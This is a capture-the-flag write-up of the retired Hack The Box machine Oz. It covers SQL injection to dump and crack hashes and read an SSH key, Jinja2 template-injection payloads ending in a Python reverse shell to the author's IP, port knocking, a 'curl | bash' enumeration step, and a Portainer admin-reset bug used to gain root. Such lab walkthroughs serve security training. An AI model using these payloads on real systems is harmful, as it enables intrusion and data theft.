# Oz

This is the write-up for the box Oz that got retired at the 12th January 2019.
My IP address was 10.10.14.5 while I did this.

Let's put this in our hosts file:
```
10.10.10.96    oz.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/oz.nmap 10.10.10.96
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
|_http-title: OZ webapi
|_http-trane-info: Problem with XML parsing of /evox/about
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
| http-title: GBR Support - Login
|_Requested resource was http://10.10.10.96:8080/login
|_http-trane-info: Problem with XML parsing of /evox/about
```

## Checking HTTP (Port 80)

The web page on port 80 has the title _"OZ webapi"_ and shows one string of text:
```
Please register a username!
```

Lets search for hidden directories with **Gobuster**:
```
gobuster -u http://10.10.10.96/ dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Unfortunately every path responds as valid, but with **wfuzz** it can be searched for hidden directories and false positives excluded:
```
wfuzz -c -u http://10.10.10.96/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

wfuzz -c -u http://10.10.10.96/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hl 0
```

There is one directory that has not a length of 0 but instead a length of 3 called _/users_.
The directory still shows the same message, but by trying out some usernames, it shows a different result at _/users/admin_:
```
GET /users/admin HTTP/1.1
Host: 10.10.10.96
(...)
```
```
{"username":"admin"}
```

When using a single quote character after the parameter, it resolves in an _500 Internal Server Error_:
```
GET /users/admin' HTTP/1.1
```
```
The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.
```

It seems like that there is a **SQL Injection vulnerability**, which can be exploited to enumerate the database.

### SQL Injection

Enumerating the database manually:
```
GET /users/admin'%20or%201='1
```
```
{"username":"dorthi"}
```

Enumerating usernames:
```
GET /users/admin' or 1='1' limit 0,1-- -
GET /users/admin' or 1='1' limit 1,1-- -
GET /users/admin' or 1='1' limit 2,1-- -
GET /users/admin' or 1='1' limit 3,1-- -
(...)

# URL encoded:
GET /users/admin'%20or%201='1'%20limit%200,1--%20-
```
```
{"username":"tin.man"}
{"username":"wizard.oz"}
{"username":"coward.lyon"}
{"username":"toto"}
```

Saving the request as a file _(oz_webapi.req)_ and sending it to **SQLmap** to dump all contents of the databases:
```
sqlmap -r oz_webapi.req
```
```
sqlmap -r oz_webapi.req --dump
```

All contents of _ozdb_ get dumped and there are two tables with interesting information.

Contents of table _users_gbw_:
```                            
Table: users_gbw
[6 entries]
+----+----------------------------------------------------------------------------------------+-------------+
| id | password                                                                               | username    |
+----+----------------------------------------------------------------------------------------+-------------+
| 1  | $pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78 | dorthi      |
| 2  | $pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk | tin.man     |
| 3  | $pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY | wizard.oz   |
| 4  | $pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY | coward.lyon |
| 5  | $pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg | toto        |
| 6  | $pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ | admin       |
+----+----------------------------------------------------------------------------------------+-------------+
```

Trying to crack the hashes with **Hashcat** after formatting them accordingly:
```
sha256:5000:aA3h3LvXOseYk3IupVQKgQ:ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78
(...)
```
```
hashcat -m 10900 ozdb.hash /usr/share/wordlists/rockyou.txt
```

After a while the hash of the user _wizard.oz_ gets cracked:
> wizardofoz22

Contents of table _tickets_gbw_:
```
Table: tickets_gbw
[12 entries]
+----+----------+--------------------------------------------------------------------------------------------------------------------------------+
| id | name     | desc                                                                                                                           |
+----+----------+--------------------------------------------------------------------------------------------------------------------------------+
| 1  | GBR-987  | Reissued new id_rsa and id_rsa.pub keys for ssh access to dorthi.                                                              |
(...)
| 8  | GBR-7945 | Dorthi should be able to find her keys in the default folder under /home/dorthi/ on the db.                                    |
(...)
| 12 | GBR-9872 | db information loaded to ticket application for shared db access                                                               |
+----+----------+--------------------------------------------------------------------------------------------------------------------------------+
```

The most important information in _tickets_gbw_ is that _dorthi_ stores SSH keys in _/home/dorthi_.
It is possible to download files from the system with **SQLmap**:
```
sqlmap -r oz_webapi.req --file-read /home/dorthi/.ssh/id_rsa
```
```
cat /root/.sqlmap/output/10.10.10.96/files/_home_dorthi_.ssh_id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,66B9F39F33BA0788CD27207BF8F2D0F6

(...)
```

We get the encrypted SSH private key of _dorthi_, but there is no SSH port open.

It is also possible to download files by using the **LOAD_FILE command**:
```
GET /users/notexisting' union select all LOAD_FILE(0x2f686f6d652f646f727468692f2e7373682f69645f727361)-- -

# URL encoded
GET /users/notexisting'%20union%20select%20all%20LOAD_FILE(0x2f686f6d652f646f727468692f2e7373682f69645f727361)--%20-
```

## Checking HTTP (Port 8080)

The web page on port 8080 forwards to _/login_:

![Login page](oz_web-1.png)

The password of the user _wizard.oz_ were cracked before and the credentials work on this login page.
It shows all the tickets from the _tickets_gbw_ table and the only feature is to create tickets.
```
POST / HTTP/1.1
Host: 10.10.10.96:8080
(...)

name=test1&desc=test1
```

After testing for some web vulnerabilities, this application seems to be vulnerable to **Server Side Template Injection**.
There are some examples on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) for this vulnerability.

As the server header shows, the web server is Python-based and **Jinja2** is for Python web applications, so code execution can be proved by sending simple math code:
```
# Request
name=test1&desc={{7*'7'}}

# Response
Name: test1 desc: 7777777
```

Reading _/etc/passwd_:
```
name=test1&desc={{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

Uploading malicious config file with which command execution is possible:
```
name=test1&desc={{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

name=test1&desc={{ config.from_pyfile('/tmp/evilconfig.cfg') }}

name=test1&desc={{ config['RUNCMD']('whoami',shell=True) }}
```
```
Name: test1 desc: root
```

Thw `whoami` command shows that we are root and command execution is proved.
Lets start a reverse shell session:
```
name=test1&desc={{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);') }}

name=test1&desc={{ config.from_pyfile('/tmp/evilconfig.cfg') }}
```

After sending the Python reverse shell command and loading it, the listener on my IP and port 9001 starts a reverse shell session as _root_.

## Escaping the Container

The IP on the box is 10.100.10.2 and the hostname is _tix-app_ which means that this is not the target box.
The file _/.dockerenv_ confirms, that it is a **Docker** container.

The `arp -an` command shows that there are two more IPs:
- 10.100.10.1
- 10.100.10.4

Checking if port 22 is open on any of those:
```
nc -zv 10.100.10.1 22

nc -zv 10.100.10.4 22
```

The IP 10.100.10.4 immediately closes the connection, which means that port 22 is filtered in some way on that client.

In the file _/app/ticketer/database.py_ are credentials for a MySQL instance on 10.100.10.4:
```
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://dorthi:N0Pl4c3L1keH0me@10.100.10.4/ozdb'
(...)
```

Checking if the default MySQL port is open:
```
nc -zv 10.100.10.4 3306
```

It is open and we are able to login into it, but unfortunately it is the same database as before and has no more interesting information:
```
mysql -u dorthi -p -h 10.100.10.4
```

In the root directory is a file in _/.secret/knockd.log_ with the following contents:
```
[options]
        logfile = /var/log/knockd.log

[opencloseSSH]

        sequence        = 40809:udp,50212:udp,46969:udp
        seq_timeout     = 15
        start_command   = ufw allow from %IP% to any port 22
        cmd_timeout     = 10
        stop_command    = ufw delete allow from %IP% to any port 22
        tcpflags        = syn
```

This is a configuration file for **Knockd** and by using **Port Knocking** on the given ports, it will open port 22 for 10 seconds:
```
nc -zu 10.10.10.96 40809
nc -zu 10.10.10.96 50212
nc -zu 10.10.10.96 46969
```
```
nc -zv 10.10.10.96 22

Ncat: Connected to 10.10.10.96:22.
```

As it closes after 10 seconds, it is more convenient to execute these commands in a loop:
```
for i in 40809 50212 46969; do nc -zu 10.10.10.96 $i; done
```

We have obtained an encrypted SSH key of _dorthi_ earlier and maybe it uses the same password that is also used in the MySQL database:
```
ssh -i dorthi.ssh dorthi@10.10.10.96
```

The password from MySQL works for the SSH key and login as _dorthi_ is successful.

## Privilege Escalation

To get an attack surface on the box, it is recommended to run any **Linux Enumeration Script**:
```
curl 10.10.14.5/LinEnum.sh | bash
```

By checking the root permissions, it shows that this user has permissions to run two docker commands:
```
sudo -l

User dorthi may run the following commands on Oz:
    (ALL) NOPASSWD: /usr/bin/docker network inspect *
    (ALL) NOPASSWD: /usr/bin/docker network ls
```

Enumerating the **Docker networks**:
```
sudo docker network ls

NETWORK ID          NAME                DRIVER              SCOPE
4896c34ce8c3        bridge              bridge              local
49c1b0c16723        host                host                local
3ccc2aa17acf        none                null                local
48148eb6a512        prodnet             bridge              local
```
```
sudo docker network inspect prodnet
sudo docker network inspect none
sudo docker network inspect host
sudo docker network inspect bridge
```

- The bridge called _prodnet_ contains three containers with the web application and the database
- The host called _host_ is empty
- The bridge called _bridge_ has a subnet that was not seen before:

```
Name": "bridge",
(...)
            "Config": [
                {
                    "Subnet": "172.17.0.0/16",
                    "Gateway": "172.17.0.1"
(...)
            "e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14": {
                "Name": "portainer-1.11.1",
                "EndpointID": "7a18d3b4cdf208160c7d75d5d37389c1720508fc79c3737ca1b756173b6ed315",
                "MacAddress": "02:42:ac:11:00:02",
                "IPv4Address": "172.17.0.2/16",
                "IPv6Address": ""
(...)
```

The host 172.17.0.2 is reachable via `ping` and the software [Portainer](https://github.com/portainer/portainer) is a management UI for **Docker and Kubernetes** environments.

Port scanning the IP with **Nmap**:
```
nmap -sT 172.17.0.2
```
```
PORT     STATE SERVICE
9000/tcp open  cslistener
```

Forwarding port 9000 to my local clients port 9001 with the **SSH command line**:
```
ssh> -L9001:172.17.0.2:9000
```

On _localhost:9001_ the **Portainer web login** can now be accessed:

![Portainer Login](oz_web-2.png)

A [bug description on GitHub](https://github.com/portainer/portainer/issues/493) for **Portainer version 1.11.1** describes how to set any password for the _admin_ user:
```
POST /api/users/admin/init HTTP/1.1
(...)

{"username":"admin","password":"newpassword"}
```

After changing the password, the login works and it is possible to create a new container:
```
Container --> Add container
```

![Create container](oz_docker-1.png)

![Create container volumes](oz_docker-2.png)

![Create container console](oz_docker-3.png)

After configuring the container, the systems root path will be mounted on _/mnt_ and every file can be read and modified.

Modifying the _/etc/sudoers_ file:
```
vi /mnt/etc/sudoers

(...)
dorthi ALL=(ALL) NOPASSWD: /bin/sh
```

Executing _/bin/sh_ as _dorthi_:
```
dorthi@Oz:~$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

This results in a root shell on the box!
